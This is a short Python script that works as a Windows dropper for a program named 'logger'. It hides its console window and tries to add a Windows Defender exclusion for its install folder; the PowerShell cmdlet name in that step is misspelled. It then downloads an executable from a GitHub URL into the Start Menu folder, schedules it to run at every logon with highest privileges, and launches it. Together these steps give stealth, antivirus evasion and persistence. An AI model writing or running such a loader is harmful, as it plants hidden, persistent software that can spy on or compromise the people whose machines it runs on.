import os
from win32gui import ShowWindow, GetForegroundWindow
from requests import get
from subprocess import run

url = 'https://github.com/Pixel48/logger/raw/exe/installer.exe'

folderpath = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Logger')
filepath = os.path.join(folderpath, 'log.exe')

def create_folder(path):
    if not os.path.exists(path):
        os.makedirs(path)

def download(url, path):
    with open(path, 'wb') as file:
        response = get(url)
        file.write(response.content)

def hide_window():
    window = GetForegroundWindow()
    ShowWindow(window, 0)

def setup_task():
    run(['schtasks', '/create', '/tn', 'Log', '/tr', f'"{filepath}"', '/sc', 'onlogon', '/rl', 'highest'])

def defender_ignore(folderpath):
    create_folder(folderpath)
    run(['powershell', '-command', '\'App-MpPreference', '-ExclusionPath', f'"{folderpath}"\'' ])

def main():
    hide_window()
    defender_ignore(folderpath)
    download(url, filepath)
    setup_task()
    os.startfile(filepath)

if __name__ == '__main__':
    main()
